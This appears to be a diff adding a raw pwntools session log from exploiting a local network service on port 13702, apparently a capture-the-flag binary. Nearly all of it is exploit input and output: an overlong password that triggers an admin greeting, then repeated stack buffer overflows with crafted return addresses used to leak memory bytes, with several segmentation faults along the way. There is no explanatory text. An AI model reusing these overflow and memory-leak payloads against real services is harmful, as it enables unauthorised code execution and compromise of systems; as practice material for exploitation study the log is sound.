@@ -1,0 +1,112 @@
+EOFError
+>>> proc = remote("localhost", 13702)
+[x] Opening connection to localhost on port 13702
+[x] Opening connection to localhost on port 13702: Trying ::1
+[+] Opening connection to localhost on port 13702: Done
+>>> proc.write(40*"A")
+>>> proc.write(0x38*b"\x00" + b"\xc9\x7f\x03\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.readline()
+b'\x1b[36mEnter password: \x1b[33m\x1b[32mHey admin!\x1b[0m\n'
+>>> proc.readline()
+b'\x1b[36m> \x1b[33mSegmentation fault\n'
+>>> proc.write(0x38*b"\x00" + b"\xb9\x12\x40\x00\x00\x00\x00\x00" + b"\n")
+>>> proc = remote("localhost", 13702)
+[x] Opening connection to localhost on port 13702
+[x] Opening connection to localhost on port 13702: Trying ::1
+[+] Opening connection to localhost on port 13702: Done
+>>> proc.write(40*"A")
+>>> proc.readline()
+b'\x1b[36mEnter password: \x1b[33m\x1b[32mHey admin!\x1b[0m\n'
+>>> proc.write(0x38*b"\x00" + b"\xb9\x12\x40\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.readline()
+b'\x1b[36m> \x1b[33m\x1b[0m\x90\xd0\xb4\xf7\xff\x7f\n'
+>>> proc.write(0x38*b"\x00" + b"\xb9\x12\x40\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.readline()
+b'\x1b[36m> \x1b[33m\x1b[0m\x90\xd0\xb4\xf7\xff\x7f\n'
+>>> proc.write(0x38*b"\x00" + b"\xb9\x12\x40\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.readline()
+b'\x1b[36m> \x1b[33m\x1b[0m\x90\xd0\xb4\xf7\xff\x7f\n'
+>>> proc.write(b"\x61\x63\x77\x41" + 0x33*b"\x61" + b"\x00" + b"\x6b\x13\x40\x00\x00\x00\x00\x00" + b"\x90\xd0\xb4\xf7\xff\x7f\x00\x00" + b"\xb9\x12\x40\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.readline()
+b'\x1b[36m> \x1b[33m\x1b[0mH\x8b\xbf\x88\n'
+>>> proc.write(b"\x61\x63\x77\x41" + 0x33*b"\x61" + b"\x00" + b"\x6b\x13\x40\x00\x00\x00\x00\x00" + b"\x94\xd0\xb4\xf7\xff\x7f\x00\x00" + b"\xb9\x12\x40\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.readline()
+b'\x1b[36m> \x1b[33m\x1b[0m\n'
+>>> proc.write(b"\x61\x63\x77\x41" + 0x33*b"\x61" + b"\x00" + b"\x6b\x13\x40\x00\x00\x00\x00\x00" + b"\x98\xd0\xb4\xf7\xff\x7f\x00\x00" + b"\xb9\x12\x40\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.readline()
+b'\x1b[36m> \x1b[33m\x1b[0mG\x04\x83\xe8\x01\x89G\x04u%H\xc7G\x08\n'
+>>> proc.write(b"\x61\x63\x77\x41" + 0x33*b"\x61" + b"\x00" + b"\x6b\x13\x40\x00\x00\x00\x00\x00" + b"\x9C\xd0\xb4\xf7\xff\x7f\x00\x00" + b"\xb9\x12\x40\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.readline()
+b'\x1b[36m> \x1b[33m\x1b[0m\x01\x89G\x04u%H\xc7G\x08\n'
+>>> proc.write(b"\x61\x63\x77\x41" + 0x33*b"\x61" + b"\x00" + b"\x6b\x13\x40\x00\x00\x00\x00\x00" + b"\xA0\xd0\xb4\xf7\xff\x7f\x00\x00" + b"\xb9\x12\x40\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.readline()
+b'\x1b[36m> \x1b[33m\x1b[0mu%H\xc7G\x08\n'
+>>> proc.write(b"\x61\x63\x77\x41" + 0x33*b"\x61" + b"\x00" + b"\x6b\x13\x40\x00\x00\x00\x00\x00" + b"\xA8\xd0\xb4\xf7\xff\x7f\x00\x00" + b"\xb9\x12\x40\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.readline()
+b'\x1b[36m> \x1b[33m\x1b[0m\n'
+>>> proc.write(b"\x61\x63\x77\x41" + 0x33*b"\x61" + b"\x00" + b"\x6b\x13\x40\x00\x00\x00\x00\x00" + b"\xB0\xd0\xb4\xf7\xff\x7f\x00\x00" + b"\xb9\x12\x40\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.readline()
+b'\x1b[36m> \x1b[33mSegmentation fault\n'
+>>> 
+KeyboardInterrupt
+>>> proc = remote("localhost", 13702)
+[x] Opening connection to localhost on port 13702
+[x] Opening connection to localhost on port 13702: Trying ::1
+[+] Opening connection to localhost on port 13702: Done
+>>> proc.write(40*"A")
+>>> proc.write(b"\x61\x63\x77\x41" + 0x33*b"\x61" + b"\x00" + b"\x6b\x13\x40\x00\x00\x00\x00\x00" + b"\x90\xd0\xb4\xf7\xff\x7f\x00\x00" + b"\xb9\x12\x40\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.readline()
+b'\x1b[36mEnter password: \x1b[33m\x1b[32mHey admin!\x1b[0m\n'
+>>> proc.readline()
+b'\x1b[36m> \x1b[33m\x1b[0mH\x8b\xbf\x88\n'
+>>> proc.write(b"\x61\x63\x77\x41" + 0x33*b"\x61" + b"\x00" + b"\x6b\x13\x40\x00\x00\x00\x00\x00" + b"\xB0\xd0\xb4\xf7\xff\x7f\x00\x00" + b"\xb9\x12\x40\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.readline()
+b'\x1b[36m> \x1b[33m\x1b[0m\n'
+>>> proc.write(b"\x61\x63\x77\x41" + 0x33*b"\x61" + b"\x00" + b"\x6b\x13\x40\x00\x00\x00\x00\x00" + b"\x88\xd0\xb4\xf7\xff\x7f\x00\x00" + b"\xb9\x12\x40\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.readline()
+b'\x1b[36m> \x1b[33m\x1b[0m\n'
+>>> proc.write(b"\x61\x63\x77\x41" + 0x33*b"\x61" + b"\x00" + b"\x6b\x13\x40\x00\x00\x00\x00\x00" + b"\x80\xd0\xb4\xf7\xff\x7f\x00\x00" + b"\xb9\x12\x40\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.readline()
+b'\x1b[36m> \x1b[33m\x1b[0m\xc0\xeb\xb7f.\x0f\x1f\x84\n'
+>>> proc.write(b"\x61\x63\x77\x41" + 0x33*b"\x61" + b"\x00" + b"\x6b\x13\x40\x00\x00\x00\x00\x00" + b"\x78\xd0\xb4\xf7\xff\x7f\x00\x00" + b"\xb9\x12\x40\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.readline()
+b'\x1b[36m> \x1b[33m\x1b[0m\x0f\xb12\x0f\x95\xc0\x0f\xb6\xc0\xeb\xb7f.\x0f\x1f\x84\n'
+>>> proc.write(b"\x61\x63\x77\x41" + 0x33*b"\x61" + b"\x00" + b"\x6b\x13\x40\x00\x00\x00\x00\x00" + b"\x70\xd0\xb4\xf7\xff\x7f\x00\x00" + b"\xb9\x12\x40\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.readline()
+b'\x1b[36m> \x1b[33m\x1b[0m1\xc0\xbe\x01\n'
+>>> proc.write(b"\x61\x63\x77\x41" + 0x33*b"\x61" + b"\x00" + b"\x6b\x13\x40\x00\x00\x00\x00\x00" + b"\x68\xd0\xb4\xf7\xff\x7f\x00\x00" + b"\xb9\x12\x40\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.readline()
+b'\x1b[36m> \x1b[33m\x1b[0m\x0f\x1f\x84\n'
+>>> proc = remote("localhost", 13702)
+[x] Opening connection to localhost on port 13702
+[x] Opening connection to localhost on port 13702: Trying ::1
+[+] Opening connection to localhost on port 13702: Done
+>>> proc.write(40*"A")
+>>> proc.write(0x38*b"\x00" + b"\xc9\x7f\x03\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.readline()
+b'\x1b[36mEnter password: \x1b[33m\x1b[32mHey admin!\x1b[0m\n'
+>>> proc.readline()
+b'\x1b[36m> \x1b[33mSegmentation fault\n'
+>>> proc = remote("localhost", 13702)
+[x] Opening connection to localhost on port 13702
+[x] Opening connection to localhost on port 13702: Trying ::1
+[+] Opening connection to localhost on port 13702: Done
+>>> proc.write(40*"A")
+>>> proc.readline()
+b'\x1b[36mEnter password: \x1b[33m\x1b[32mHey admin!\x1b[0m\n'
+>>> proc.write(0x38*b"\x00" + b"\xc9\x7f\x03\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.readline()
+b'\x1b[36m> \x1b[33mSegmentation fault\n'
+>>> proc = remote("localhost", 13702)
+[x] Opening connection to localhost on port 13702
+[x] Opening connection to localhost on port 13702: Trying ::1
+[+] Opening connection to localhost on port 13702: Done
+>>> proc.write(40*"A")
+>>> proc.readline()
+b'\x1b[36mEnter password: \x1b[33m\x1b[32mHey admin!\x1b[0m\n'
+>>> proc.write(0x38*b"\x00" + b"\xb9\x7f\x03\x00\x00\x00\x00\x00" + b"\n")
+>>> proc.readline()
+b'\x1b[36m> \x1b[33mSegmentation fault\n'
+>>> 
+
+
